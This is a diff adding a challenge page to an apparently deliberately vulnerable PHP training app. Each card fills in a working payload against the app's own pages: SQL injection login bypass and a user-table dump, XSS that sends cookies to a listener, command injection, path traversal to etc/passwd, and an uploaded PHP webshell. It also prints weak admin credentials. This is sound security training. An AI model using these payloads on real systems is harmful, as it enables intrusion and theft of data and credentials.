@@ -1,0 +1,140 @@
+<?php /* VulnCorp — interactive challenge hub (fill-and-run console). Targets the live pages. */ ?>
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>VulnCorp — Challenges</title>
+<style>
+:root{--bg:#0b0f16;--card:#0d1117;--card2:#161b22;--ink:#dfe6ee;--muted:#8b98a5;--line:#1c2330;--brand:#1f6feb;--ok:#2e9b4f}
+*{box-sizing:border-box}body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--ink);margin:0;line-height:1.5}
+.topbar{position:sticky;top:0;z-index:5;background:linear-gradient(120deg,#0e1726,#1f6feb);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 10px rgba(0,0,0,.4)}
+.brand{font-weight:700;font-size:1.15em}.badge{font-size:.72em;background:rgba(255,255,255,.18);padding:2px 9px;border-radius:20px}
+.nav{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}.nav a{color:#fff;text-decoration:none;font-size:.85em;background:rgba(255,255,255,.14);padding:5px 11px;border-radius:7px}.nav a:hover{background:rgba(255,255,255,.28)}
+.wrap{max-width:900px;margin:22px auto;padding:0 16px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
+.card h2{margin:0 0 8px;font-size:1.02em;color:#8ab4ff;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.card h2 code{background:#0b0f16;color:#9ce6a0;padding:2px 7px;border-radius:5px;font-size:.92em}
+.flag-pill{font-size:.7em;font-weight:600;background:#3a2d12;color:#ffd080;padding:2px 8px;border-radius:20px}
+details{margin:6px 0 10px}summary{cursor:pointer;color:var(--brand);font-size:.9em}
+details .pl{display:block;margin:8px 0;background:#05070b;color:#9ce6a0;padding:8px 10px;border-radius:6px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;white-space:pre-wrap;word-break:break-all}
+form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
+input[type=text],textarea{flex:1;min-width:200px;padding:8px 10px;border:1px solid var(--line);border-radius:7px;background:#05070b;color:var(--ink);font-family:ui-monospace,Consolas,monospace;font-size:.9em}
+textarea{min-height:70px;width:100%}
+button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
+button.ghost{background:#1c2330;color:#8ab4ff}button:hover{filter:brightness(1.12)}
+.res{width:100%;height:200px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:none}
+.rx{white-space:pre-wrap;background:#05070b;color:var(--ink);border:1px solid var(--line);border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:none;max-height:200px;overflow:auto}
+.muted{color:var(--muted);font-size:.92em}a{color:#8ab4ff}
+footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted);font-size:.85em;border-top:1px solid var(--line)}
+</style></head><body>
+<div class="topbar"><span class="brand">🛡 VulnCorp</span><span class="badge">app 1 · challenge hub</span>
+<nav class="nav"><a href="index.php">Home</a><a href="hub.php">🎯 Hub</a><a href="progress.php">📊 Progress</a><a href="reset.php">↺ Reset</a><a href="feedback.php">💬 Feedback</a></nav></div>
+<div class="wrap">
+<div class="card"><h2>Challenge hub — fill &amp; run 🏁</h2>
+<p class="muted">Each card targets a live page. See the <b>vuln class</b>, work out the payload yourself; stuck?
+Click <b>💡 hint</b> → <b>use this</b> to drop it in the box → <b>Run</b> (the result loads right below). Full
+walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a href="index.php">Home</a>.</p></div>
+
+<!-- Login: SQLi bypass + weak creds -->
+<div class="card"><h2><code>login.php</code> <span class="flag-pill">🏁 SQLi auth-bypass</span> <span class="flag-pill">weak creds</span></h2>
+  <p class="muted">Log in without a password (inject), or with guessed creds.</p>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_lu">admin'-- -</code>
+    <button type="button" class="ghost" onclick="document.getElementById('in_lu').value=document.getElementById('pl_lu').textContent;document.getElementById('in_lp').value='x'">use this ▶</button>
+    <span class="muted"> · or weak creds <code>admin : S3ntinel!Admin</code></span></details>
+  <form method="post" action="login.php" target="r_login" onsubmit="show('r_login')">
+    <input type="text" id="in_lu" name="username" placeholder="username" style="min-width:140px">
+    <input type="text" id="in_lp" name="password" placeholder="password" style="min-width:140px"><button>Login ▶</button></form>
+  <iframe name="r_login" id="r_login" class="res"></iframe></div>
+
+<!-- Search: UNION SQLi + reflected XSS -->
+<div class="card"><h2><code>index.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span> <span class="flag-pill">🏁 reflected XSS</span></h2>
+  <p class="muted">Directory search. Dump the users table, or pop an alert.</p>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_q">' UNION SELECT username,password,role FROM users-- -</code>
+    <button type="button" class="ghost" onclick="fill('in_q','pl_q')">SQLi ▶</button>
+    <code class="pl" id="pl_qx">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
+    <button type="button" class="ghost" onclick="fill('in_q','pl_qx')">XSS ▶</button></details>
+  <form method="get" action="index.php" target="r_q" onsubmit="show('r_q')">
+    <input type="text" id="in_q" name="q" placeholder="search payload…"><button>Run ▶</button></form>
+  <iframe name="r_q" id="r_q" class="res"></iframe></div>
+
+<!-- Guestbook: stored XSS -->
+<div class="card"><h2><code>index.php</code> guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
+  <p class="muted">Post a comment; it's stored and rendered to every visitor. Steal the non-HttpOnly <code>flag</code> cookie.</p>
+  <details><summary>💡 hint</summary>Start a listener: <code>python3 -m http.server 9001</code>, post this, then reload Home:
+    <code class="pl" id="pl_gb">&lt;script&gt;new Image().src='http://127.0.0.1:9001/steal?c='+document.cookie&lt;/script&gt;</code>
+    <button type="button" class="ghost" onclick="document.getElementById('in_gb').value=document.getElementById('pl_gb').textContent">use this ▶</button></details>
+  <form method="post" action="index.php" target="r_gb" onsubmit="show('r_gb')">
+    <input type="text" name="author" placeholder="name" style="min-width:120px">
+    <input type="text" id="in_gb" name="body" placeholder="message / payload…"><button>Post ▶</button></form>
+  <iframe name="r_gb" id="r_gb" class="res"></iframe></div>
+
+<!-- Profile: IDOR -->
+<div class="card"><h2><code>profile.php?id=</code> <span class="flag-pill">🏁 IDOR</span></h2>
+  <p class="muted">Profiles have no ownership check. Walk the ids (1 = admin).</p>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_id">1</code>
+    <button type="button" class="ghost" onclick="fill('in_id','pl_id')">use this ▶</button>
+    <span class="muted"> · then try 2, 3, 4…</span></details>
+  <form method="get" action="profile.php" target="r_id" onsubmit="show('r_id')">
+    <input type="text" id="in_id" name="id" placeholder="a user id…" style="min-width:120px"><button>Run ▶</button></form>
+  <iframe name="r_id" id="r_id" class="res"></iframe></div>
+
+<!-- Net Tools: command injection -->
+<div class="card"><h2><code>tools.php?host=</code> <span class="flag-pill">🏁 command injection</span></h2>
+  <p class="muted">The host is passed to a shell <code>ping</code>. Chain your own command.</p>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_cmd">127.0.0.1; cat ../private/cmdi_flag.txt</code>
+    <button type="button" class="ghost" onclick="fill('in_cmd','pl_cmd')">use this ▶</button>
+    <span class="muted"> · also <code>| id</code>, <code>$(id)</code></span></details>
+  <form method="get" action="tools.php" target="r_cmd" onsubmit="show('r_cmd')">
+    <input type="text" id="in_cmd" name="host" placeholder="host; command…"><button>Run ▶</button></form>
+  <iframe name="r_cmd" id="r_cmd" class="res"></iframe></div>
+
+<!-- Page: LFI -->
+<div class="card"><h2><code>index.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
+  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Escape it with <code>../</code> to a file outside the web root.</p>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_pg">../../lfi_secret/flag.txt</code>
+    <button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button>
+    <span class="muted"> · system file: pile on <code>../</code> then <code>etc/passwd</code></span></details>
+  <form method="get" action="index.php" target="r_pg" onsubmit="show('r_pg')">
+    <input type="text" id="in_pg" name="page" placeholder="file path…"><button>Run ▶</button></form>
+  <iframe name="r_pg" id="r_pg" class="res"></iframe></div>
+
+<!-- Upload: webshell -->
+<div class="card"><h2><code>upload.php</code> → <code>uploads/</code> <span class="flag-pill">🏁 upload → RCE</span></h2>
+  <p class="muted">No file-type checks. Upload a PHP webshell, then run commands through it.</p>
+  <details><summary>💡 hint</summary>Upload the code below as <code>shell.php</code>, then run <code>cat ../private/upload_flag.txt</code> in the command box.</details>
+  <label class="muted">1) shell code &amp; name</label>
+  <textarea id="up_code">&lt;?php system($_GET['cmd']); ?&gt;</textarea>
+  <form onsubmit="doUpload();return false"><input type="text" id="up_name" value="shell.php" style="min-width:120px"><button>Upload ▶</button></form>
+  <pre id="r_up" class="rx"></pre>
+  <label class="muted">2) run a command through uploads/shell.php</label>
+  <details><summary>💡 hint</summary><code class="pl" id="pl_up">cat ../private/upload_flag.txt</code>
+    <button type="button" class="ghost" onclick="fill('in_up','pl_up')">use this ▶</button></details>
+  <form method="get" action="uploads/shell.php" target="r_upc" onsubmit="show('r_upc')">
+    <input type="text" id="in_up" name="cmd" placeholder="command… (e.g. id)"><button>Run ▶</button></form>
+  <iframe name="r_upc" id="r_upc" class="res"></iframe></div>
+
+<!-- Info disclosure -->
+<div class="card"><h2>Information disclosure <span class="flag-pill">🏁 config backup</span></h2>
+  <p class="muted"><code>robots.txt</code> maps the "hidden" paths; the <code>.bak</code> is served as plaintext.
+  (Open in a new tab — a browser hides <code>&lt;?php?&gt;</code>; use <b>View Source / Ctrl+U</b>.)</p>
+  <p><a href="robots.txt" target="_blank">/robots.txt</a> · <a href="config.php.bak" target="_blank">/config.php.bak</a>
+   · <a href=".well-known/security.txt" target="_blank">/.well-known/security.txt</a>
+   · <a href="private/deployment-notes.txt" target="_blank">/private/deployment-notes.txt</a></p></div>
+
+<!-- CSP -->
+<div class="card"><h2>Weak CSP <span class="flag-pill">analysis</span></h2>
+  <p class="muted">Read the policy and the cookie in the browser: <b>DevTools (F12) → Network</b> → reload →
+  click the document → <b>Response Headers</b> (the <code>Content-Security-Policy</code>), and
+  <b>Console</b> → <code>document.cookie</code> (the <code>flag</code> cookie — proves it's not HttpOnly).
+  <code>'unsafe-inline'</code> makes the stored-XSS cookie theft above work despite the CSP.</p></div>
+
+</div>
+<footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
+<script>
+function fill(inputId, plId){ document.getElementById(inputId).value = document.getElementById(plId).textContent; }
+function show(frameId){ document.getElementById(frameId).style.display='block'; }
+function doUpload(){
+  var out=document.getElementById('r_up'); out.style.display='block'; out.textContent='uploading…';
+  var name=document.getElementById('up_name').value||'shell.php';
+  var fd=new FormData(); fd.append('file', new Blob([document.getElementById('up_code').value],{type:'application/x-httpd-php'}), name);
+  fetch('upload.php',{method:'POST',body:fd}).then(r=>r.text()).then(t=>out.textContent=t.replace(/<[^>]*>/g,' ').replace(/\s+/g,' ').trim()).catch(e=>out.textContent='error: '+e);
+}
+</script>
+</body></html>
